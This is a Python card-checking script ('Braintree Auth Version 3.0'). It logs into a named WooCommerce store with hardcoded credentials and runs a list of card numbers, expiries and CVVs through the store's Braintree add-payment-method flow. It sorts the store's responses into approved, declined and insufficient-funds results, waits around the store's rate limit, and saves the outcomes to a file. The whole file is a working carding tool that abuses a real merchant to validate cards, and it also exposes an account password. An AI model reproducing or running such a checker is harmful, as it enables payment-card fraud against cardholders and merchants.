import requests
import re
import base64
import json
import uuid
import asyncio
import aiohttp
import time
import sys
import os

EMAIL = "opdevildragon@gmail.com"
PASSWORD = "DDcc55@&#"

def load_cards(filename):
    cards = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    parts = line.split('|')
                    if len(parts) >= 4:
                        cards.append({
                            'cc': parts[0],
                            'mes': parts[1],
                            'ano': parts[2],
                            'cvv': parts[3]
                        })
    except FileNotFoundError:
        print(f"File {filename} not found!")
        return []
    return cards

def get_headers1():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'cache-control': 'max-age=0',
        'upgrade-insecure-requests': '1',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'referer': 'https://livresq.com/en/my-account/',
        'accept-language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
        'priority': 'u=0, i',
    }

def get_headers2():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'origin': 'https://livresq.com',
        'upgrade-insecure-requests': '1',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://livresq.com/en/my-account/',
        'accept-language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
        'priority': 'u=0, i',
    }

def get_headers3():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'upgrade-insecure-requests': '1',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://livresq.com/en/my-account/payment-methods/',
        'accept-language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
        'priority': 'u=0, i',
    }

def get_headers4():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'origin': 'https://livresq.com',
        'upgrade-insecure-requests': '1',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://livresq.com/en/my-account/add-payment-method/',
        'accept-language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
        'priority': 'u=0, i',
    }

def get_ajax_headers():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'origin': 'https://livresq.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://livresq.com/en/my-account/add-payment-method/',
        'accept-language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
        'priority': 'u=1, i',
    }

def get_braintree_headers(auth_fingerprint):
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36',
        'Content-Type': 'application/json',
        'Authorization': f'Bearer {auth_fingerprint}',
        'Braintree-Version': '2018-05-10',
        'Origin': 'https://assets.braintreegateway.com',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://assets.braintreegateway.com/',
        'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7',
    }

def login_to_account():
    session = requests.Session()
    
    print("Step 1: Getting login page...")
    response = session.get('https://livresq.com/en/my-account/', headers=get_headers1())
    print(f"Status: {response.status_code}")
    
    nonce_match = re.search(r'id="woocommerce-login-nonce"[^>]*value="([^"]+)"', response.text)
    if not nonce_match:
        print("ERROR: Could not find login nonce")
        return None, "LOGIN_NONCE_NOT_FOUND"
    
    login_nonce = nonce_match.group(1)
    print(f"Login nonce found: {login_nonce}")
    
    login_data = {
        'username': EMAIL,
        'password': PASSWORD,
        'woocommerce-login-nonce': login_nonce,
        '_wp_http_referer': '/en/contul-meu/',
        'login': 'Log in',
        'trp-form-language': 'en'
    }
    
    print("Step 2: Submitting login form...")
    response = session.post('https://livresq.com/en/my-account/', headers=get_headers2(), data=login_data)
    print(f"Status: {response.status_code}")
    
    if 'woocommerce-error' in response.text:
        error_match = re.search(r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>', response.text, re.DOTALL)
        error_msg = error_match.group(1).strip() if error_match else "Login failed"
        error_msg = re.sub(r'\s+', ' ', error_msg)
        print(f"Login error: {error_msg}")
        return None, error_msg
    
    if 'logout' in response.text.lower() or 'dashboard' in response.text.lower():
        print("Login successful!")
        return session, "Success"
    
    print("Login failed - unknown reason")
    return None, "Login failed"

def get_payment_nonces(session):
    print("Step 3: Getting payment page...")
    response = session.get('https://livresq.com/en/my-account/add-payment-method/', headers=get_headers3())
    print(f"Status: {response.status_code}")
    
    add_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"', response.text)
    if not add_nonce_match:
        print("ERROR: Could not find add payment nonce")
        return None, None
    
    client_nonce_match = re.search(r'client_token_nonce":"([^"]+)"', response.text)
    if not client_nonce_match:
        client_nonce_match = re.search(r'client_token_nonce\\u0022:\\u0022([^"]+)\\u0022', response.text)
    
    add_nonce = add_nonce_match.group(1)
    client_nonce = client_nonce_match.group(1) if client_nonce_match else None
    
    print(f"Add payment nonce: {add_nonce[:20]}...")
    print(f"Client nonce: {client_nonce[:30] if client_nonce else 'None'}...")
    
    return add_nonce, client_nonce

def get_client_token(session, client_nonce):
    print("Step 4: Getting client token from Braintree...")
    
    ajax_url = 'https://livresq.com/wp-admin/admin-ajax.php'
    ajax_data = {
        'action': 'wc_braintree_credit_card_get_client_token',
        'nonce': client_nonce,
    }
    
    print(f"POST to: {ajax_url}")
    response = session.post(ajax_url, headers=get_ajax_headers(), data=ajax_data)
    print(f"Response status: {response.status_code}")
    
    if response.status_code != 200:
        print(f"ERROR: AJAX request failed with status {response.status_code}")
        print(f"Response: {response.text[:200]}")
        return None
    
    try:
        token_response = response.json()
        print(f"Response keys: {token_response.keys()}")
        
        if 'data' not in token_response:
            print("ERROR: No 'data' field in response")
            return None
        
        print("Decoding client token...")
        decoded_token = base64.b64decode(token_response['data']).decode('utf-8')
        token_json = json.loads(decoded_token)
        auth_fingerprint = token_json.get('authorizationFingerprint')
        
        if not auth_fingerprint:
            print("ERROR: No authorizationFingerprint found")
            return None
        
        print(f"Auth fingerprint obtained: {auth_fingerprint[:50]}...")
        return auth_fingerprint
        
    except Exception as e:
        print(f"ERROR parsing response: {str(e)}")
        return None

async def tokenize_card(auth_fingerprint, cc, mes, ano, cvv):
    print("Step 5: Sending card to Braintree API...")
    
    async with aiohttp.ClientSession() as session:
        session_id = str(uuid.uuid4())
        print(f"Session ID: {session_id}")
        
        graphql_query = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': session_id,
            },
            'query': '''mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                tokenizeCreditCard(input: $input) {
                    token
                    creditCard {
                        bin
                        brandCode
                        last4
                        expirationMonth
                        expirationYear
                    }
                }
            }''',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        
        async with session.post('https://payments.braintree-api.com/graphql', headers=get_braintree_headers(auth_fingerprint), json=graphql_query) as resp:
            print(f"Braintree API response status: {resp.status}")
            
            if resp.status != 200:
                print(f"ERROR: Braintree API returned {resp.status}")
                return None
            
            result = await resp.json()
            
            if 'errors' in result:
                print(f"Braintree errors: {result['errors']}")
                return None
            
            token = result.get('data', {}).get('tokenizeCreditCard', {}).get('token')
            
            if token:
                print(f"Card tokenized successfully: {token[:30]}...")
            else:
                print("ERROR: No token in response")
            
            return token

def add_payment_method(session, payment_token, add_nonce):
    print("Step 6: Adding payment method to account...")
    
    for retry in range(4):
        post_data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'visa',
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': payment_token,
            'wc_braintree_device_data': '',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': add_nonce,
            '_wp_http_referer': '/en/contul-meu/add-payment-method/',
            'woocommerce_add_payment_method': '1',
            'trp-form-language': 'en'
        }
        
        print(f"Submitting payment method (attempt {retry + 1}/4)...")
        response = session.post('https://livresq.com/en/my-account/add-payment-method/', headers=get_headers4(), data=post_data)
        print(f"Response status: {response.status_code}")
        
        if 'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds.' in response.text:
            print("Waiting 15 seconds...")
            time.sleep(15)
            continue
        
        error_match = re.search(r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>', response.text, re.DOTALL)
        
        if error_match:
            error_text = error_match.group(1).strip()
            error_text = re.sub(r'\s+', ' ', error_text)
            error_text = re.sub(r'&nbsp;', ' ', error_text)
            
            if 'risk_threshold' in error_text:
                print(f"❌ RISK REJECTED: {error_text}")
                return False, f"RISK REJECTED: {error_text}"
            
            code_match = re.search(r'Status code (\d+):', error_text)
            if code_match:
                if 'CVV' in error_text or 'cvv' in error_text:
                    print(f"❌ CVV DECLINED: {error_text}")
                    return False, f"CVV DECLINED: {error_text}"
                elif 'Insufficient' in error_text or 'insufficient' in error_text:
                    print(f"✅ INSUFFICIENT FUNDS - Partial Approval: {error_text}")
                    return True, f"INSUFFICIENT FUNDS: {error_text}"
                else:
                    print(f"❌ DECLINED: {error_text}")
                    return False, f"DECLINED: {error_text}"
            else:
                if 'CVV' in error_text or 'cvv' in error_text:
                    print(f"❌ CVV ERROR: {error_text}")
                    return False, f"CVV ERROR: {error_text}"
                else:
                    print(f"❌ ERROR: {error_text}")
                    return False, f"ERROR: {error_text}"
        
        if 'Nice!' in response.text or 'AVS' in response.text or 'avs' in response.text.lower():
            avs_match = re.search(r'AVS[^.]*\.', response.text, re.IGNORECASE)
            avs_text = avs_match.group(0) if avs_match else "AVS Approved"
            print(f"✅ APPROVED! {avs_text}")
            return True, f"APPROVED with AVS: {avs_text}"
        
        if 'payment method was added' in response.text.lower() or 'successfully added' in response.text.lower():
            print(f"✅ SUCCESS! Payment method added")
            return True, "SUCCESS: Payment method added"
        
        success_match = re.search(r'<div class="woocommerce-message"[^>]*>(.*?)</div>', response.text, re.DOTALL)
        if success_match:
            success_text = success_match.group(1).strip()
            success_text = re.sub(r'<[^>]+>', '', success_text)
            success_text = re.sub(r'\s+', ' ', success_text)
            print(f"✅ SUCCESS! {success_text}")
            return True, f"SUCCESS: {success_text}"
        
        if retry < 3:
            print(f"Retry {retry + 1}/4 - Waiting 15 seconds...")
            time.sleep(15)
        else:
            print("⚠️ UNKNOWN RESPONSE")
            return False, "UNKNOWN RESPONSE"
    
    return False, "MAX RETRIES EXCEEDED"

async def process_card(session, card, card_index, total):
    print(f"\n{'='*60}")
    print(f"[{card_index}/{total}] Processing Card: {card['cc']}")
    print(f"Expiry: {card['mes']}/{card['ano']} | CVV: {card['cvv']}")
    print(f"{'='*60}")
    
    add_nonce, client_nonce = get_payment_nonces(session)
    if not add_nonce or not client_nonce:
        return {'card': card['cc'], 'success': False, 'message': 'FAILED: Could not get payment nonces'}
    
    auth_fingerprint = get_client_token(session, client_nonce)
    if not auth_fingerprint:
        return {'card': card['cc'], 'success': False, 'message': 'FAILED: Could not get client token'}
    
    payment_token = await tokenize_card(auth_fingerprint, card['cc'], card['mes'], card['ano'], card['cvv'])
    if not payment_token:
        return {'card': card['cc'], 'success': False, 'message': 'FAILED: Card tokenization failed'}
    
    success, message = add_payment_method(session, payment_token, add_nonce)
    return {'card': card['cc'], 'success': success, 'message': message}

async def main():
    print("\n" + "="*60)
    print("Braintree Auth Version 3.0")
    print("="*60)
    print("\nFile format: card_number|expiry_month|expiry_year|cvv")
    print("Example: 4111111111111111|12|2028|123")
    print("\n" + "="*60)
    
    filename = input("\nFile: ").strip()
    
    if not os.path.exists(filename):
        print(f"\n❌ File '{filename}' not found!")
        return
    
    cards = load_cards(filename)
    
    if not cards:
        print(f"\n❌ No valid cards found in {filename}")
        return
    
    print(f"\n✅ Loaded {len(cards)} card(s) from {filename}")
    
    session, msg = login_to_account()
    if not session:
        print(f"\n❌ Login failed: {msg}")
        return
    
    print(f"✅ Logged in as: {EMAIL}")
    
    results = []
    for i, card in enumerate(cards, 1):
        result = await process_card(session, card, i, len(cards))
        results.append(result)
        
        if i < len(cards):
            print("\nWaiting 5 seconds before next card...")
            await asyncio.sleep(5)
    
    print("\n" + "="*60)
    print("FINAL RESULTS")
    print("="*60)
    
    success_count = sum(1 for r in results if r['success'])
    fail_count = len(results) - success_count
    
    print(f"\nTotal Cards: {len(results)}")
    print(f"✅ Success: {success_count}")
    print(f"❌ Failed: {fail_count}")
    print("-"*60)
    
    for result in results:
        status = "✅" if result['success'] else "❌"
        print(f"{status} {result['card']}: {result['message']}")
    
    with open('results.txt', 'w') as f:
        f.write(f"Results - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("="*60 + "\n")
        f.write(f"Total Cards: {len(results)} | Success: {success_count} | Failed: {fail_count}\n")
        f.write("="*60 + "\n\n")
        for result in results:
            status = "SUCCESS" if result['success'] else "FAILED"
            f.write(f"{status}|{result['card']}|{result['message']}\n")
    
    print(f"\n📄 Results saved to results.txt")

if __name__ == "__main__":
    asyncio.run(main())